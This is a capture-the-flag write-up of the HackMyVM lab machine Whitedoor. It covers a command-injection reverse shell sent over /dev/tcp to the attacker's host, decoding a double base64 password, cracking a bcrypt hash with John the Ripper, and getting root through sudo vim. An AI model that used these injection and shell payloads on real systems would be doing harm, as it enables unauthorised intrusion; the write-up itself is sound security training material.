---
title: Write-up Whitedoor on HackMyVM
author: eMVee
date: 2023-12-21 12:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM,command injection, sudo]
render_with_liquid: false
---

Last night I was working on Crossbow, a vulnerable machine that I downloaded from HackMyVM. After being stuck on the privilege escalation for quite a few hours and not making it yet, I started hacking into another machine. To simply focus your thoughts on something else. In this case, I downloaded Whitedoor and imported it into my lab environment. In this writeup I describe how I hacked this easy machine.

## Getting started
As usual, we should start by creating a project directory for the machine.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV 

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Whitedoor 

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Whitedoor    
```
Next we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ ip a           
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:aa:f7:1f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.5/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 528sec preferred_lft 528sec
    inet6 fe80::a00:27ff:feaa:f71f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:41:5a:bb:89 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-c3199b3ee524: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a1:ae:fd:79 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c3199b3ee524
       valid_lft forever preferred_lft forever
```
After identifying our own IP address we should determine the IP address of our target. One of my favourite tools to do this is fping. It give a nice list of IP address what are available on the network.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.5
10.0.2.7

```
Now we can assign the IP address to a variable so we can use the variable in our commands.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ ip=10.0.2.7  
```
Let's find out if the machines is responding to our ping request.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ ping -c 3 $ip          
PING 10.0.2.7 (10.0.2.7) 56(84) bytes of data.
64 bytes from 10.0.2.7: icmp_seq=1 ttl=64 time=0.397 ms
64 bytes from 10.0.2.7: icmp_seq=2 ttl=64 time=0.448 ms
64 bytes from 10.0.2.7: icmp_seq=3 ttl=64 time=0.379 ms

--- 10.0.2.7 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2032ms
rtt min/avg/max/mdev = 0.379/0.408/0.448/0.029 ms
```
Based on the answer we can tell that this machine is probably running on a Linux operating system.

## Enumeration
Next we should check what ports and services are available on our target. We can do this with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ sudo nmap -sC -sV $ip -p- -T4 -A
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-20 21:54 CET
Nmap scan report for 10.0.2.7
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:53:E0:E9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 10.0.2.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds

```
When nmap finished the scan we can see several interesting ports open on our target. Let's add some information to our notes.

- Linux, probably a Debian operating system
- Port 21
	- FTP
	- Anonymous allowed
	- File: README.txt
	- vsFTPd 3.0.3
- Port 22
	- SSH
	- OpenSSH 9.2p1
- Port 80
	- HTTP
	-  Apache 2.4.57
	- Title: Home

Since there is a FTP service availabe and an anonymous user can logon we should check if we can upload any file as well.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ nano test      

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat test    
test.test
```
When we have the file created, we are ready to logon to the FTP service.
After logon to the FTP service we should try to download all available files and upload our test file.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ ftp $ip -a                        
Connected to 10.0.2.7.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bin
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||8117|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||24612|)
150 Opening BINARY mode data connection for README.txt (13 bytes).
100% |*******************************|    13        0.20 KiB/s    00:00 ETA
226 Transfer complete.
13 bytes received in 00:00 (0.19 KiB/s)
ftp> put test 
local: test remote: test
229 Entering Extended Passive Mode (|||51975|)
550 Permission denied.
ftp> pwd
Remote directory: /
ftp> exit
221 Goodbye.


```
The upload failed, but we were able to download the file. We should inspect this file.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat README.txt 
¡Good luck!
```
Nothing useful yet! We should check the webservice now. We can run whatweb to see what technologies is used.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ whatweb http://$ip
http://10.0.2.7 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.0.2.7], Title[Home]

```
For the moment we don't hace any new information yet. It might be a good idea if we visit the website with the browser.

![image](/assets/img/WriteUp/HackMyVM/Whitedoor/Pasted image 20231220220202.png){: width="700" height="400" }

Let's try to submit an empty form. Perhaps an error is shown to us.

![image](/assets/img/WriteUp/HackMyVM/Whitedoor/Pasted image 20231220220239.png){: width="700" height="400" }

The message displayed on the screen tells us we can run the command `ls`. This si a system command. This makes is it probably vulnerable to command injection.

![image](/assets/img/WriteUp/HackMyVM/Whitedoor/Pasted image 20231220220318.png){: width="700" height="400" }

Let's try to run the following `ls;id;whoami;hostname;ip a; pwd`. Now we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ rlwrap nc -lvp 4321
```

## Initial access
Since this website is vulnerable for command injection we can start a reverse shell to our machine with the following command.
```bash
ls; bash -c 'exec bash -i &>/dev/tcp/10.0.2.5/4321 <&1'
```
![image](/assets/img/WriteUp/HackMyVM/Whitedoor/Pasted image 20231220220928.png){: width="700" height="400" }

After submitting the data we should return to our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ rlwrap nc -lvp 4321
listening on [any] 4321 ...
10.0.2.7: inverse host lookup failed: Unknown host
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.7] 41382
bash: cannot set terminal process group (521): Inappropriate ioctl for device
bash: no job control in this shell
www-data@whitedoor:/var/www/html$ 

```
A connection has been established. This gives us the possibilitiy to run commands in s shell and try to gain more privileges.
Let's first check who we are and on what machine we are currently working.
```bash
www-data@whitedoor:/var/www/html$ whoami
whoami
www-data
www-data@whitedoor:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@whitedoor:/var/www/html$ hostname
hostname
whitedoor
www-data@whitedoor:/var/www/html$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:53:e0:e9 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.7/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 444sec preferred_lft 444sec
    inet6 fe80::a00:27ff:fe53:e0e9/64 scope link 
       valid_lft forever preferred_lft forever
www-data@whitedoor:/var/www/html$ pwd
pwd
/var/www/html
www-data@whitedoor:/var/www/html$ ls
ls
blackdoor.webp
blackindex.php
index.php
whitedoor.jpg
www-data@whitedoor:/var/www/html$ ls /home -ahlR
ls /home -ahlR
/home:
total 16K
drwxr-xr-x  4 root       root       4.0K Nov 16 16:58 .
drwxr-xr-x 18 root       root       4.0K Nov 15 23:05 ..
drwxr-x---  9 Gonzalo    whiteshell 4.0K Nov 17 18:11 Gonzalo
drwxr-xr-x  9 whiteshell whiteshell 4.0K Nov 17 18:47 whiteshell
ls: cannot open directory '/home/Gonzalo': Permission denied

/home/whiteshell:
total 48K
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 .
drwxr-xr-x 4 root       root       4.0K Nov 16 16:58 ..
lrwxrwxrwx 1 root       root          9 Nov 16 00:43 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3.5K Apr 23  2023 .bashrc
drwxr-xr-x 3 whiteshell whiteshell 4.0K Nov 16 17:05 .local
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 18:43 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Documents
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Downloads
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Music
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Pictures
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Public

/home/whiteshell/.local:
total 12K
drwxr-xr-x 3 whiteshell whiteshell 4.0K Nov 16 17:05 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
drwx------ 3 whiteshell whiteshell 4.0K Nov 16 17:05 share
ls: cannot open directory '/home/whiteshell/.local/share': Permission denied

/home/whiteshell/Desktop:
total 12K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 18:43 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16 09:07 .my_secret_password.txt

/home/whiteshell/Documents:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Downloads:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Music:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Pictures:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Public:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
www-data@whitedoor:/var/www/html$ 

```
There is a hidden file `.my_secret_password.txt` on the desktop of the user whiteshell. We can read this file since the read permission is grated to the whole world.
```bash
www-data@whitedoor:/var/www/html$ cat /home/whiteshell/Desktop/.my_secret_password.txt
<at /home/whiteshell/Desktop/.my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
www-data@whitedoor:/var/www/html$ 

```
We should copy the content after the `:` and paste in into a file on our Kali machine.
The hash is probably a base64 hash. We can decrypt it to plaintext.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ nano secret.txt 

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat secret.txt 
VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat secret.txt | base64 -d
VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat secret.txt | base64 -d | base64 -d
Th1sIsTh3P4sSwOrDblac5

```
We now have our first password. This makes it possible to switch user to whiteshell. As soon as we are the new user we should enumerate again.
```bash
www-data@whitedoor:/var/www/html$ su whiteshell
su whiteshell
Password: Th1sIsTh3P4sSwOrDblac5
whoami
whiteshell
id
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
hostname
whitedoor
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:53:e0:e9 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.7/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 383sec preferred_lft 383sec
    inet6 fe80::a00:27ff:fe53:e0e9/64 scope link 
       valid_lft forever preferred_lft forever
pwd
/var/www/html
cd ~
ls
Desktop
Documents
Downloads
Music
Pictures
Public

```
Since we would like to know if we can sudo anything we should run `sudo -l`.
```bash
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```
The shell is not upgraded, so we can upgrade it or move to a SSH service. Since SSH service is running on port 22 we should switch to SSH. We can kill the current process with `CTRL + C` on the keybaod.
Then we should try to logon to ssh with the user whiteshell.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ ssh whiteshell@$ip              
The authenticity of host '10.0.2.7 (10.0.2.7)' can't be established.
ED25519 key fingerprint is SHA256:zI6VeeIsxD3aPkTJng3eY1ZoPGGqaAdBAGU7E1nlHxI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.7' (ED25519) to the list of known hosts.
whiteshell@10.0.2.7's password: 
Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 17 18:08:29 2023 from 192.168.2.5
whiteshell@whitedoor:~$ sudo -l
[sudo] password for whiteshell: 
Sorry, user whiteshell may not run sudo on whitedoor.
whiteshell@whitedoor:~$ 

```
This user is not allowed to sudo anything.
Let's see if we can enumerate all user directories and files.
```bash
whiteshell@whitedoor:~$ ls -ahlR /home
/home:
total 16K
drwxr-xr-x  4 root       root       4.0K Nov 16 16:58 .
drwxr-xr-x 18 root       root       4.0K Nov 15 23:05 ..
drwxr-x---  9 Gonzalo    whiteshell 4.0K Nov 17 18:11 Gonzalo
drwxr-xr-x  9 whiteshell whiteshell 4.0K Nov 17 18:47 whiteshell

/home/Gonzalo:
total 52K
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 .
drwxr-xr-x 4 root    root       4.0K Nov 16 16:58 ..
-rw------- 1 Gonzalo Gonzalo     718 Nov 17 20:06 .bash_history
-rw-r--r-- 1 Gonzalo Gonzalo     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Gonzalo Gonzalo    3.5K Apr 23  2023 .bashrc
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 19:26 Desktop
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 16 21:04 Documents
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:09 Downloads
drwxr-xr-x 3 Gonzalo Gonzalo    4.0K Nov 16 17:03 .local
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:11 Music
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:07 Pictures
-rw-r--r-- 1 Gonzalo Gonzalo     807 Apr 23  2023 .profile
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:09 Public

/home/Gonzalo/Desktop:
total 16K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 19:26 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..
-r--r--r-- 1 root    root         61 Nov 16 20:49 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16 21:54 user.txt

/home/Gonzalo/Documents:
total 8.0K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 16 21:04 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..

/home/Gonzalo/Downloads:
total 8.0K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:09 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..

/home/Gonzalo/.local:
total 12K
drwxr-xr-x 3 Gonzalo Gonzalo    4.0K Nov 16 17:03 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..
drwx------ 3 Gonzalo Gonzalo    4.0K Nov 16 17:03 share
ls: cannot open directory '/home/Gonzalo/.local/share': Permission denied

/home/Gonzalo/Music:
total 8.0K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:11 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..

/home/Gonzalo/Pictures:
total 8.0K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:07 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..

/home/Gonzalo/Public:
total 8.0K
drwxr-xr-x 2 root    Gonzalo    4.0K Nov 17 18:09 .
drwxr-x--- 9 Gonzalo whiteshell 4.0K Nov 17 18:11 ..

/home/whiteshell:
total 48K
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 .
drwxr-xr-x 4 root       root       4.0K Nov 16 16:58 ..
lrwxrwxrwx 1 root       root          9 Nov 16 00:43 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3.5K Apr 23  2023 .bashrc
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 18:43 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Documents
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Downloads
drwxr-xr-x 3 whiteshell whiteshell 4.0K Nov 16 17:05 .local
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Music
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Pictures
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 Public

/home/whiteshell/Desktop:
total 12K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 18:43 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16 09:07 .my_secret_password.txt

/home/whiteshell/Documents:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Downloads:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/.local:
total 12K
drwxr-xr-x 3 whiteshell whiteshell 4.0K Nov 16 17:05 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
drwx------ 3 whiteshell whiteshell 4.0K Nov 16 17:05 share

/home/whiteshell/.local/share:
total 12K
drwx------ 3 whiteshell whiteshell 4.0K Nov 16 17:05 .
drwxr-xr-x 3 whiteshell whiteshell 4.0K Nov 16 17:05 ..
drwx------ 2 whiteshell whiteshell 4.0K Nov 16 17:05 nano

/home/whiteshell/.local/share/nano:
total 8.0K
drwx------ 2 whiteshell whiteshell 4.0K Nov 16 17:05 .
drwx------ 3 whiteshell whiteshell 4.0K Nov 16 17:05 ..

/home/whiteshell/Music:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Pictures:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..

/home/whiteshell/Public:
total 8.0K
drwxr-xr-x 2 whiteshell whiteshell 4.0K Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4.0K Nov 17 18:47 ..
```
Another hidden file `.my_secret_hash` on the desktop of a user. This time it is the user Gonzalo.
We should check the content of this file.
```bash
whiteshell@whitedoor:~$ cat /home/Gonzalo/Desktop/.my_secret_hash
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
whiteshell@whitedoor:~$ 

```
We should copy the hash and try to crack it with John the Ripper.
First we have to create a file, paste the hash and crack it. Just like that easy
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ nano hash.jtr  

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ cat hash.jtr                          
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6

┌──(emvee㉿kali)-[~/Documents/HMV/Whitedoor]
└─$ john hash.jtr
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
qwertyuiop       (?)     
1g 0:00:00:24 DONE 2/3 (2023-12-20 22:18) 0.04095g/s 88.45p/s 88.45c/s 88.45C/s panget..gangsta
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
We have cracked the password hash we John the Ripper. We can now switch user to Gonzalo and move on.
```bash
whiteshell@whitedoor:~$ su Gonzalo
Password:
Gonzalo@whitedoor:/home/whiteshell$ cd ~
Gonzalo@whitedoor:~$ ls 
Desktop  Documents  Downloads  Music  Pictures  Public
Gonzalo@whitedoor:~$ ls D
Desktop/   Documents/ Downloads/ 
Gonzalo@whitedoor:~$ ls Desktop/
.my_secret_hash  user.txt         
Gonzalo@whitedoor:~$ cat Desktop/user.txt 
HERE IS THE USER FLAG
Gonzalo@whitedoor:~$ 

```
Great we have now the user flag! We should now move on to gain more privileges.

## Privilege escalation
Let's check if we can sudo anything with `sudo -l`.
```bash
Gonzalo@whitedoor:~$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
Gonzalo@whitedoor:~$ 

```
It looks like we can sudo vim without any password. VIM is used more often in capture the flag machines a privilege esclation. There is a good resource on [GTFObins](https://gtfobins.github.io/gtfobins/vim/#sudo) about privileges escalation with vim. We should use on of the optiosn to gain more privileges on the target.

```bash
Gonzalo@whitedoor:~$ sudo /usr/bin/vim -c ':!/bin/sh'

# 

```
Since a shell is started we can capture as root the last flag. 
```bash
# whoami
root
# hostname
whitedoor
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:53:e0:e9 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.7/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 400sec preferred_lft 400sec
    inet6 fe80::a00:27ff:fe53:e0e9/64 scope link 
       valid_lft forever preferred_lft forever
# cat /root/root.txt
HERE IS THE ROOT FLAG
# 

```